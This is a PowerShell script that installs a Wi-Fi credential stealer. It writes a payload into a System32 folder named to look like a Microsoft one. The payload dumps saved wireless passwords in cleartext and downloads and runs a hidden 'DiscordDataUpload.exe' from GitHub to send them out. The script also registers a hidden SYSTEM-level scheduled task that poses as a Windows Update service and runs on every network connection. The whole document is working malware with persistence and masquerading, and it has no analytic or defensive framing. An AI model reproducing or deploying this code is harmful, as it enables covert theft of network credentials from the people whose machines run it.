$shellscriptpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\"
$shellscriptname = "WifiDataReaper.ps1"
$fullPath = Join-Path $shellscriptpath $shellscriptname
$wifitaskname = "Windows Update Service For Wlan Drivers"
#Task Deletion
$Name = "Delteion of Scheduled task for WfiDataReaping"
$prompt = $(Write-Host "Proceed With $Name (y/n)" -ForegroundColor Yellow -BackgroundColor Black -NoNewline; Read-Host)
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($prompt.ToLower() -eq "y") {
if (Get-ScheduledTask -TaskName $wifitaskname -ErrorAction SilentlyContinue) {
Unregister-ScheduledTask -TaskName $wifitaskname -Confirm:$false
} else {}
if (Test-Path $fullPath -PathType Leaf) {
    Remove-Item -Path $fullPath -Force
}
} else {}
#Task Creation
$Name = "Scheduling of task for WfiDataReaping"
$prompt = $(Write-Host "Proceed With $Name (y/n)" -ForegroundColor Yellow -BackgroundColor Black -NoNewline; Read-Host)
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($prompt.ToLower() -eq "y") {
if (-not (Test-Path $shellscriptpath -PathType Container)) {
    # If it doesn't exist, create it
    New-Item -Path $shellscriptpath -ItemType Directory
}
$scriptContent = @'
$exeUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
$loggedInUser = $username = Get-WmiObject -Class Win32_UserProfile | Where-Object { $_.Special -eq $false } | ForEach-Object { $_.LocalPath.Split('\')[-1] }
$outputFilePath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$loggedInUser.txt"
$exepath = Join-Path (Split-Path $outputFilePath) "DiscordDataUpload.exe"
if (-not (Test-Path $outputFilePath)) {
    New-Item -Path $outputFilePath -ItemType File | Out-Null
}
(netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
    $name = $_.Matches.Groups[1].Value.Trim()
    (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
        $pass = $_.Matches.Groups[1].Value.Trim()
        [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass; USER = $loggedInUser }
    }
} | Format-Table -AutoSize | Out-File -FilePath $outputFilePath -Encoding UTF8 -Force

if (-not (Test-Path $exepath)) {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exepath
}
Start-Process -FilePath $exepath -ArgumentList "-File $outputFilePath" -WindowStyle Hidden
$process = Get-Process -Name "DiscordDataUpload"
$process.WaitForExit()
Remove-Item -Path $outputFilePath -Force
Start-Sleep -Seconds 2
'@
Remove-Item $fullPath -Force -ErrorAction SilentlyContinue
$scriptContent | Set-Content -Path $fullPath -Force
#Task Creation
$wifitask = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-13T00:56:52.6271595</Date>
    <Author>Microsoft\System</Author>
    <Description>Windows Server Update Services, previously known as Software Update Services, is a computer program and network service developed by Microsoft Corporation that enables administrators to manage the distribution of updates and hotfixes released for Microsoft products to computers in a corporate environment.</Description>
    <URI>\Windows Update Service For Wlan Drivers</URI>
  </RegistrationInfo>
  <Triggers>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT5M</Delay>
    </EventTrigger>
    <RegistrationTrigger>
      <Enabled>true</Enabled>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Queue</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -File "C:\Windows\System32\SecureBootUpdatesMicrosoft\WifiDataReaper.ps1"</Arguments>
      <WorkingDirectory>C:\Windows\System32\SecureBootUpdatesMicrosoft\</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
"@
if (Get-ScheduledTask -TaskName $wifitaskname -ErrorAction SilentlyContinue) {
Unregister-ScheduledTask -TaskName $wifitaskname -Confirm:$false
} else {}
Register-ScheduledTask -Xml $wifitask -TaskName $wifitaskname | Out-Null
Start-ScheduledTask -TaskName $wifitaskname
} else {}
